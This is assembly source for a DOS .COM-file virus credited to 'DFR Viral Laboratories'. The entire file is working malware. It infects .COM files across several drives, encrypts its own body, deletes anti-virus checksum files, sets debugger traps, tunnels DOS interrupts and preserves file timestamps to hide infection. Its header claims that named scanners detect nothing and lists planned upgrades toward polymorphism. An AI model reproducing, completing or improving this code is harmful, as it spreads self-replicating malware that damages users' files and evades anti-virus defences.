;
; Rage Against The Machine #14 - Saruman / DFR Viral Laboratories
;
; Specs: NON-RES .COM INFECTOR, ENCRYPTION, TIME/DATE PRESERVATION
;        ANTI-VIRUS CHECKSUM-FILE REMOVAL, DEBUG-TRAPS,
;        MULTIPLE-DRIVE INFECTION, BASIC-STEALTH
;
; Size: 725 bytes
;
; Scanstring: 16 bytes (2 wildcard bytes)
;
; Scanner Results:
;           TBAV         various non-alert flags
;           SCAN         nothing
;           F-PROT       nothing
;           F-PROT+Heur  nothing
;
; To Do:
; * Implement fully polymorphic decryption. (variable len?)
;
; * Save int21 to unused vectors - set flag. always use this alternative
;   int in the future if the flag is set. (gives a kind of tunneling).
;
; * Generate write_virus and decrypter in [video?]mem and copy to new hosts.
;
; * Fix problem with invalid drives (CD-ROM)
;   = Install critical error handler?
;
.model tiny
.code
.radix 16

include fileattr.inc

VirusSize      equ END_OF_VIRUS - MAIN
EntryOfs       equ STARTCODE - MAIN - 3

TunnelINT      equ 3h

SizeMIN        equ 2
SizeMAX        equ 064000d-VirusSize         ; (553 bytes saved for data+stack)
DisinfectCount equ 2
MaxInfectCount equ 10d

         org 100

main:    jmp startcode
dummy    db 0                               ; jmp short<>jmp near (2 vs 3 bytes)

;                                             BEWARE! DESTROYS - di,cx,flags
;db 0,0,0,0,0,0,0,0,0,0,0

endecrypt:
         mov  di,offset encryption_start
         mov  cx,(end_of_virus-encryption_start-2)/2
cryptloop:
          db  81h,33h                       ; xor word ptr[bp+di],cryptkey
cryptkey: db  0,0
         add  di,2
         loop cryptloop
         ret

;db 0,0,0,0,0,0,0,0,0,0

;==========================================================================
; ** Virus Entry Point **
;==========================================================================
startcode:
         mov  bx,0000h
         push bx
         pop  bp
         call endecrypt

;==========================================================================
; The encrypted virus code starts here, first we play around a little
; and initialize some variables...
;==========================================================================
encryption_start:
include        no_msav.inc

         call checkINT81
         jnc  int80ok
         call setupINT3

int80ok:

         mov  ax,2500h
         lea  dx,bp+newINT1
         int  TunnelINT                    ; fool realmode debuggers.
         inc  ax
         int  TunnelINT                    ; int 0 & int 1 hooked!

include no_deb01.inc

         mov  di,100h                      ; Recreate header
         lea  si,bp+orgheader
         cld
         movsw
         movsb                             ; move from SI => DI (2+1 bytes)

         mov ah,1ah
         lea dx,bp+dta
         int TunnelINT                     ; Setup DTA area

         lea  dx,bp+TBdriver
         call findfirst                    ; Check if TBFILXXX is loaded.
         jc   no_tbav_present              ; No?
         jmp megaexit                      ; Yes! .. Bye!

;==========================================================================
; Check if INT81 contains marker. (=INT3 contains "original" int21H vector)
;** Make marker dependant on int21 so that i can check if someone else
;   has changed my little int3 tunnel...
;==========================================================================
checkINT81:
         push es
         xor  si,si
         mov  es,si
         mov  ax,word ptr ds:[bp+message1]
         cmp  word ptr es:[81h*4],ax
         jne  noINT81
         mov  ax,word ptr ds:[bp+message2]
         cmp  word ptr es:[81h*4+2],ax
         jne  noINT81
         clc
         jmp  okINT81
noINT81: stc
okINT81: pop es
         ret

;==========================================================================
; Copy INT21 to INT3 ** Should copy int 80 if MARKER is set.
;==========================================================================
setupINT3:
         push ds
         push ds
         xor  si,si
         mov  es,si
         mov  ds,si
         mov  si,21h*4
         mov  di,TunnelINT*4
         cld
         movsw
         movsw                              ; copy INT21 to INT3 (TunnelINT)
         pop  ds
         lea  si,bp+message1
         mov  di,81h*4
         movsw
         movsw                              ; copy marker to INT 81h
         pop  es
         ret


no_tbav_present:
         call setup_writevirbuf
         mov  byte ptr [bp+infected],0

;==========================================================================
; Start the process of finding new hosts...
;==========================================================================
         mov  ah,19h
         int  TunnelINT
         mov  byte ptr [bp+olddrive],al     ; store starting drive
         mov  byte ptr [bp+drive],2         ; start on C:
NextDrive:
         inc  byte ptr [bp+drive]
         mov  dl,byte ptr [bp+drive]
         cmp  dl,027d
         jne  proceed
         jmp  exit                          ; all done!
proceed:
         mov  ah,36h
         int  TunnelINT                     ; get free space
         cmp  ax,0ffffh
         je   nextdrive                     ; loop if NOT valid drive
           
         mov  ah,64d
         add  ah,byte ptr[bp+drive]
         lea  si,bp+wildcard
         mov  byte ptr [si],ah              ; fix 'X:*.COM'

         mov  dx,si
         mov  cx,anyfile-VolumeID-SysFile-Directory
         call findfirst
         jc   nextdrive                     ; ... not found, next drive.

         mov  dl,byte ptr [bp+drive]
         dec  dl
         mov  ah,0eh
         int  TunnelINT                     ; Chdir to the correct drive
checkit: 
; Fungerar detta?!?!
         cmp  word ptr[bp+file_size],SizeMAX
         ja   next_victim                   ; Too big?

         cmp  word ptr[bp+file_size+2],0
         jne  next_victim

         cmp  word ptr[bp+file_size],SizeMIN
         jbe  next_victim

         call process_victim                ; INFECT!

next_victim:
         mov  ah,4fh
         int  TunnelINT                     ; Find Next
         jnc  checkit                       ; Aha! Another host found..
         jmp  nextdrive                     ; All done on this drive, next!

;==========================================================================
; This procedure will infect the file pointed to by the DTA.filename
;==========================================================================
process_victim:
         mov  ax,4301h
         lea  dx,bp+filename
         mov  cx,0                          ; -not- xor cx,cx => z-flag probl.
         int  TunnelINT                     ; clear file-attributes
         jnz  okidoki                       ; BEFORE OPEN! = IMPORTANT!
close_skip_file:
         jmp  skip_file

okidoki:
         mov  ax,3d02
         lea  dx,bp+filename
         int  TunnelINT                     ; Open file r/w

         mov  bp+file,ax                    ; Save the file handle
         xchg ax,bx
         mov  ah,3f
         mov  cx,3
         lea  dx,bp+orgheader
         int  TunnelINT                     ; Read first 3 bytes & store them

         cmp  word ptr [bp+orgheader],'ZM'  ; Check renamed EXE
         je   close_skip_file

         mov  ax,word ptr[bp+file_size]
         sub  ax,VirusSize-EntryOFS
         cmp  word ptr [bp+orgheader+1],ax
         je   skip_file                     ; is already infected?

;==========================================================================
; Erase stupid checksum files.
;==========================================================================
         lea  dx,bp+kill_tbav
         call kill_ds_dx
         lea  dx,bp+kill_msav               ; add dx,<magiskt>
         call kill_ds_dx

;=====================
; Do infect.
;=====================
         mov  ax,5d53h
         cmp  word ptr [bp+startcode+3],ax  ; cmp with push bx+pop bp
         jne  set_header2
         mov  ax,0eb8bh
 set_header2:
         mov  word ptr [bp+startcode+3],ax

         mov  ax,word ptr [bp+file_size]    ; Calculate jmp-header
         mov  word ptr [bp+startcode+1],ax  ; fix MOV BP,<value> at start ...
          
         add  ax,ENTRYOFS
         mov  byte ptr [BP+BUF],0E9h        ; E9 = opcode for JMP
         mov  word ptr [BP+BUF+1],ax        ; ax = filesize+offset into virus

         mov  ax,4200
         xor  cx,cx
         xor  dx,dx
         int  TunnelINT                     ; Seek to beginning of file
         
         mov  ah,40
         mov  cx,3
         lea  dx,BP+BUF
         int  TunnelINT                     ; Write JMP to header
;        jc   skip_file
         inc  word ptr [bp+infected]

         mov  ax,4202
         xor  cx,cx
         xor  dx,dx
         int  TunnelINT                     ; Seek to end of file

         inc  word ptr [bp+total_infected]
         inc  byte ptr [bp+fixme]
         call initSEED
;        call morph_endecrypt
         call writevirbuf

skip_file:
         mov  ax,5701
         mov  bx,BP+FILE
         mov  cx,word ptr [bp+file_time]
         mov  dx,word ptr [bp+file_date]
         int  TunnelINT                     ; Restore old datestamp

         mov  ah,3e
         int  TunnelINT                     ; Close file

         lea  dx,bp+filename
         mov  ax,4301
         xor  ch,ch
         mov  cl,byte ptr [bp+attribute]
         int  TunnelINT                     ; Restore old attributes

         ret

;===========================================================================
; Initialize random seed
;===========================================================================
initSEED:
         cli
         mov  al,0                          ; latch timer 0
         out  43,al
         in   al,40h                        ; read seed from 8253 count (16 bits)
         mov  ah,al                         ; which changes 1,193,180 t/sec
         in   al,40h
         sti
         and  ax,ax                         ; check for zero
         jnz  save
         inc  ax                            ; cannot use 0, use 1 instead.
save:    mov  word ptr [bp+cryptkey],ax
         ret

;===========================================================================
; Kill file whose name is pointed to by DS:DX
;===========================================================================
kill_ds_dx:
         xor  cx,cx
         mov  ax,4301h
         int  TunnelINT                     ; Clean the file attribs
         jc   damned
         mov  ah,41h
         int  TunnelINT                     ; delete file
damned:  ret


findfirst:                                  ; (dx=filename. Return Z flag)
         mov  cx,anyfile-VolumeID-SysFile-Directory
         mov  ah,4eh
         int  TunnelINT
         ret

;==========================================================================
; Disinfect file. Must be able to optimize this?
;==========================================================================
do_disinfect:
         mov  si,word ptr[ds:02Ch]          ; Get environment seg from PSP
         mov  es,si
         xor  di,di
         mov  ax,0001h                      ; Search for end of environment
         cld
scanENV:
         scasw
         jne  scanENV                       ; Do search
         xor  al,al
scanEND: scasb
         jnz  scanEND
         std
         mov  al,'\'
scanSLASH:
         scasb
         jnz  scanSLASH
         inc  di
         inc  di
         mov  dx,di
         push es
         pop  ds
         call findfirst                     ; Setup DTA-record (filesize)
         mov  ax,3d01
         int  TunnelINT                     ; Open file write-only
         push cs
         pop  ds
         mov  bx,ax
         mov  ah,40h
         mov  cx,3
         mov  dx,100h
         int  TunnelINT                     ; Write original header
         mov  ax,4200h
         xor  cx,cx
         mov  dx,word ptr [bp+file_size]
         sub  dx,virussize
         int  TunnelINT                     ; Seek to start of virus.
         mov  ah,40h
         xor  cx,cx
         int  TunnelINT                     ; Truncate
         mov  ah,3eh
         int  TunnelINT                     ; Close file
         ret

;==========================================================================
; Virus Closedown code
;==========================================================================
exit:
         mov  ah,0eh
         mov  dl,byte ptr [bp+olddrive]
         int  TunnelINT                     ; Chdir back to starting drive

         cmp  byte ptr [bp+infected],DisinfectCOUNT
         jl   megaexit
         call do_disinfect

megaexit:
         mov  ah,1ah                        ; ReSet DTA address ...
         mov  dx,80h                        ; ... to default DTA
         int  TunnelINT
         xor  ax,ax                         ; Reset all regs
         mov  bx,ax
         mov  cx,ax
         mov  dx,ax
         xor  si,si
         mov  di,ax
         mov  sp,0FFFEh                     ; SP=0
         mov  bp,100h                       ; BP=100h (RETurn addr)
         push bp
         xor  bp,bp
         ret                                ; Return to 100h

;=============================================================================
; Copy the write_virus code to the heap, outside the encryption.
;=============================================================================
setup_writevirbuf:
        lea  di,bp+writevirbuf
        lea  si,bp+write_virus
        mov  cx,end_write_virus - write_virus
        rep  movsb                          ; movsW in "release" ver.
        ret

;
; This is the code that is copied.
;
write_virus:
       lea  bx,bp+endecrypt
       call bx                              ; encrypt code
       mov  ah,40
       lea  dx,bp+main
       mov  bx,bp+file
       mov  cx,VirusSize
       int  21h                             ; write virus body
       lea  bx,bp+endecrypt
       call bx                              ; decrypt code again
       ret
end_write_virus:

newINT1:
            db 0eah,0,0,0ffh,0ffh           ; Call FAR [FFFF:0000]

orgheader   db 0cdh,020h,0                   ;terminate for 1:st generation
wildcard:   db 0,':*.!!!',0
kill_tbav   db 'anti-vir.dat', 0
kill_msav   db 'chklist.ms', 0
tbdriver    db 'TBFILXXX',0
message1    db 'Ra'
message2    db 'ge Against The Machine'

total_infected dw 0

END_OF_VIRUS:

             include dta.inc
buf          db ?,?,?
file         dw ?
drive        db ?
olddrive     db ?
infected     dw ?
seed         dw ?

writevirbuf: db end_write_virus-write_virus+1 dup(?)

end     main
